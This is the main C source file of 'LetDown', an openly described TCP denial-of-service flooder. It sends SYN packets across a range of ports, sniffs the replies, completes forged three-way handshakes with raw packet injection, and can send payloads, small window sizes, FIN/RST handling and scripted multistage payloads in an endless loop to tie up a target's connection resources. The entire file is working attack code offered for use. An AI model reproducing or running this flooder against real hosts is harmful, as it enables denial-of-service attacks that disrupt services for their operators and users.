/*
 * LetDown, tcp dos flooder. Raw 3 way handshake...
 * See http://insecure.org/stf/tcp-dos-attack-explained.html
 *
 * Copyright (C) 2009  Acri Emanuele <crossbower@gmail.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include "letdown.h"

/*
 * Destructor and signal handler
 */
void pre_exit(int sig)
{
    fprintf(stderr, "Program interrupted. Exiting...\n");

    // turn off firewall
    firewall_off();

    if(verbosity(1)) {
        end_time = time(NULL);

        printf("LetDown end: ");
        printtime();

        printf("Total connections %d in %d seconds.\n", progopt.yport - progopt.xport + 1, end_time - start_time);
    }

    exit(0);
}

/*
 * TCP syn packets sender
 */
void tcp_syn_loop(u_int32_t srcaddr, u_int32_t dstaddr, u_int16_t start_prt, u_int16_t end_prt)
{
    u_int16_t curr_prt;

    // sender loop
    for(curr_prt=start_prt; curr_prt<=end_prt; curr_prt++) {

        /* Send SYN */

        // packet injection
        if(inject_tcp_packet(srcaddr, dstaddr, curr_prt, progopt.dport, 1, 0, TH_SYN) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }

        usleep(progopt.time);

        // if endless loop
        if(progopt.loop) {
            if(curr_prt==end_prt) curr_prt=start_prt;
        }
    }
}

/*
 * TCP stack functions
 * used by tcp_stack()
 */

/*
 * TCP RST packet
 */
int tcp_reset_h(sess_key keyhash, struct sniff_ip *ip, struct sniff_tcp *tcp)
{
    fprintf(stderr, "Error: received tcp reset packet\n");

    // remove session
    sess_map[keyhash].active = 0;

    return 1;
}

/*
 * TCP SYN-ACK packet
 */
int tcp_syn_ack_h(sess_key keyhash, struct sniff_ip *ip, struct sniff_tcp *tcp)
{
    // initialize new session
    init_new_session(ip->ip_dst.s_addr, ip->ip_src.s_addr, ntohs(tcp->th_dport), ntohs(tcp->th_sport));

    sess_map[keyhash].tcp_seq = 2;
    sess_map[keyhash].tcp_ack = ntohl(tcp->th_seq) + 1;

    /* Send ACK */

    // packet injection
    if(inject_tcp_packet(keyhash, TH_ACK) == -1) {
        fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
        exit(EXIT_FAILURE);
    }

    /* Send PAYLOAD (with or without fragmentation) */

    if(progopt.payload_set() && progopt.frag && progopt.fragc) {
        int frags = progopt.frag;

        // send fragments
        for(int i=0; i<progopt.fragc; i++) {

            // packet injection
            if(inject_tcp_packet(keyhash, progopt.payload, TH_ACK) == -1) {
                fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
                exit(EXIT_FAILURE);
            }

            progopt.frag += frags;
        }

        // restore
        progopt.frag = frags;

        // update sequence number
        sess_map[keyhash].tcp_seq += strlen(progopt.payload);
    }

    else if(progopt.payload_set()) {

        // packet injection
        if(inject_tcp_packet(keyhash, progopt.payload, TH_ACK) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }

        // update sequence number
        sess_map[keyhash].tcp_seq += strlen(progopt.payload);
    }

    return 1;
}

/*
 * TCP ACK packet
 */
int tcp_ack_h(sess_key keyhash, struct sniff_ip *ip, struct sniff_tcp *tcp)
{
    /* Send ACK */

    // packet injection
    if(inject_tcp_packet(keyhash, TH_ACK, progopt.window) == -1) {
        fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
        exit(EXIT_FAILURE);
    }

    return 1;
}

/*
 * TCP FIN-ACK packet
 */
int tcp_fin_ack_h(sess_key keyhash, struct sniff_ip *ip, struct sniff_tcp *tcp)
{
    /* Send RST */
    if(progopt.rst) {

        // packet injection
        if(inject_tcp_packet(keyhash, TH_RST) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }
    }

    /* Send ACK and FIN */
    else {

        sess_map[keyhash].tcp_ack = ntohl(tcp->th_seq) + 1;

        // packet injection
        if(inject_tcp_packet(keyhash, TH_ACK) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }

        // packet injection
        if(inject_tcp_packet(keyhash, TH_FIN|TH_ACK) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }
    }

    // remove session
    sess_map[keyhash].active = 0;

    return 1;
}

/*
 * TCP FIN packet
 */
int tcp_fin_h(sess_key keyhash, struct sniff_ip *ip, struct sniff_tcp *tcp)
{
    /* Send RST */
    if(progopt.rst) {

        // packet injection
        if(inject_tcp_packet(keyhash, TH_RST) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }
    }

    /* Send ACK and FIN */
    else {

        // packet injection
        if(inject_tcp_packet(keyhash, TH_FIN|TH_ACK) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }

        // packet injection
        if(inject_tcp_packet(keyhash, TH_FIN) == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }
    }

    // remove session
    sess_map[keyhash].active = 0;

    return 1;
}

/*
 * Emulated TCP stack
 */
void tcp_stack(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    struct sniff_ethernet *ethernet;  /* The ethernet header */
    struct sniff_ip *ip;              /* The IP header */
    struct sniff_tcp *tcp;            /* The TCP header */

    u_int32_t size_ip;                /* IP header size */
    u_int32_t size_tcp;               /* TCP header size */

    char *payload;                    /* Packet payload */
    int size_payload=0;

    sess_key keyhash;

    /* ANALYZE CAPTURED PACKET */

    // set ethernet, ip and tcp pointers

    ethernet = (struct sniff_ethernet*)(packet);

    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip)*4;
    if (size_ip < 20) {
        return;
    }

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp)*4;
    if (size_tcp < 20) {
        return;
    }

    payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);


    /* CALCULATE KEY HASH */

    keyhash = calc_key(ip->ip_dst.s_addr, ip->ip_src.s_addr, ntohs(tcp->th_dport), ntohs(tcp->th_sport));


    /* Check for transmission errors or useless packets */

    // duplicated (resend last packet)
    if(sess_map[keyhash].active && sess_map[keyhash].host_seq==ntohl(tcp->th_seq) &&
        sess_map[keyhash].host_ack==(tcp->th_ack) && sess_map[keyhash].payload_len==size_payload) {

        // packet injection
        if(resend_last() == -1) {
            fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
            exit(EXIT_FAILURE);
        }

        return;
    }

    // useless
    else if(sess_map[keyhash].active==0 && tcp->th_flags != (TH_SYN|TH_ACK)) {
        return;
    }

    // update data
    else if(sess_map[keyhash].active) {
        sess_map[keyhash].host_seq=ntohl(tcp->th_seq);
        sess_map[keyhash].host_ack=ntohl(tcp->th_ack);
        sess_map[keyhash].payload_len=size_payload;

        // if it is just a keep-alive ack...
        if(tcp->th_flags == TH_ACK && size_payload==0 && progopt.mlt_payload_set()) {
            return;
        }

        // update ack number
        else {
            sess_map[keyhash].tcp_ack += size_payload;
        }
    }


    /* MULTISTAGE PAYLOAD */
    // if multistage payload is set...

    if(progopt.mlt_payload_set()) {

        // for now only ACK/PUSH-ACK or SYN-ACK packets are sent
        // to the script_engine function.

        // ACK/PUSH-ACK
        if(tcp->th_flags == (TH_ACK) || tcp->th_flags == (TH_PUSH|TH_ACK)) {
            script_engine(keyhash, ip, tcp, payload);
            return;
        }

        // SYN-ACK
        else if(tcp->th_flags == (TH_SYN|TH_ACK)) {

            // first complete 3-way-handshake
            tcp_syn_ack_h(keyhash, ip, tcp);

            script_engine(keyhash, ip, tcp, payload);
            return;
        }

        // continue to TCP STACK EMULATION...
    }

    /* TCP STACK EMULATION */
    // if multistage payload is not set...

    /* FLAGS OF RECEIVED PACKET */

    /* RST received */
    if(tcp->th_flags&TH_RST) {
        tcp_reset_h(keyhash, ip, tcp);
        return;
    }

    /* SYN-ACK received */
    else if(tcp->th_flags == (TH_SYN|TH_ACK)) {
        tcp_syn_ack_h(keyhash, ip, tcp);
        return;
    }

    /* ACK received */
    else if(tcp->th_flags == (TH_ACK) || tcp->th_flags == (TH_PUSH|TH_ACK)) {
        if(!progopt.ack) return;

        tcp_ack_h(keyhash, ip, tcp);
        return;
    }

    /* FIN-ACK received */
    else if((tcp->th_flags == (TH_FIN|TH_ACK)) && (progopt.fin || progopt.rst)) {
        if(!progopt.fin && !progopt.rst) return;

        tcp_fin_ack_h(keyhash, ip, tcp);
        return;
    }

    /* FIN received */
    else if(tcp->th_flags == (TH_FIN)) {
        if(!progopt.fin && !progopt.rst) return;

        tcp_fin_h(keyhash, ip, tcp);
        return;
    }

    return;
}

/*
 * Flood start function
 */
void flood_start()
{
    // pids
    pid_t pid[2];

    // libnet stuff
    char lnet_errbuf[LIBNET_ERRBUF_SIZE];

    // pcap stuff
    char pcap_errbuf[PCAP_ERRBUF_SIZE];
    //char filter_exp[MAX_ARG];

    // ip stuff
    u_int32_t src_ip, dst_ip, mask, net;

    if(verbosity(1)) {
        start_time = time(NULL);

        printf("LetDown start: ");
        printtime();
        printf("\n");
    }

    /* Initialize LIBNET */
    if (!libnet_initialize(lnet_errbuf, &src_ip, &dst_ip)) {
        fprintf(stderr, "libnet_initialize() failed: %s\n", lnet_errbuf);
        exit(EXIT_FAILURE);
    }

    /* Initialize PCAP */
    if (!pcap_initialize(pcap_errbuf, &net, &mask)) {
        fprintf(stderr, "pcap_initialize() failed: %s\n", pcap_errbuf);
        exit(EXIT_FAILURE);
    }

    /* SENDING syn packets */
    if((pid[0] = fork())==0) {

        if(verbosity(2)) {
            printf("Tcp Syn loop started.\n");
        }

        // set timer
        alarm(progopt.alarm);

        // sender function
        tcp_syn_loop(src_ip, dst_ip, progopt.xport, progopt.yport);

        exit(0);
    }

    /* Start SNIFFING */
    else if(!progopt.syn && (pid[1]=fork())==0) {

        if(verbosity(2)) {
            printf("Sniffer started.\n");
        }

        // set timer
        alarm(progopt.alarm);

        // install filter
        if (!pcap_install_filter(pcap_errbuf, &net, &mask)) {
            fprintf(stderr, "pcap_install_filter() failed: %s\n", pcap_errbuf);
            exit(EXIT_FAILURE);
        }

        // Init python engine (if necessary)
        if(progopt.mlt_payload_set()) {
            if(init_engine(progopt.mlt_payload)!=1){
                fprintf(stderr, "Error initializing the python engine.\n");
                exit(EXIT_FAILURE);
            }
        }

        // set callback function
        pcap_loop(handle, -1, tcp_stack, NULL);

        // this is never called:
        exit(0);
    }

    /* daddy process */
    else {
        int stat;

        // install signal handler
        signal(SIGINT, pre_exit);

        if(verbosity(2)) {
            printf("Waiting for spawned processes:\n");
        }

        // syn loop
        waitpid(pid[0], &stat, NULL);
        if(verbosity(2)) {
            printf("Syn loop process terminated.\n");
        }

        // sniffer
        if(!progopt.syn) {
            waitpid(pid[1], &stat, NULL);
            if(verbosity(2)) {
                printf("Sniffer process terminated.\n");
            }
        }
    }

    // free compiled filter
    pcap_freecode(&fp);

    // close libnet
    libnet_destroy(l);

    // close pcap
    pcap_close(handle);

    if(verbosity(1)) {
        end_time = time(NULL);

        printf("LetDown end: ");
        printtime();

        printf("Total connections %d in %d seconds.\n", progopt.yport - progopt.xport + 1, end_time - start_time);
    }

    return;
}

/*
 * Program init
 */
int main(int argc, char **argv)
{
    // Fill options struct
    parseopt(argc, argv);

    // Firewall rule on
    if(progopt.firewall_set()) {
        firewall_on();
    }

    // Start flooding
    flood_start();

    // Firewall rule off
    if(progopt.firewall_set()) {
        firewall_off();
    }

    // TODO
    // pre_exit now is a destructor
    // see letdown.h...
    //pre_exit(0);

    return 0;
}

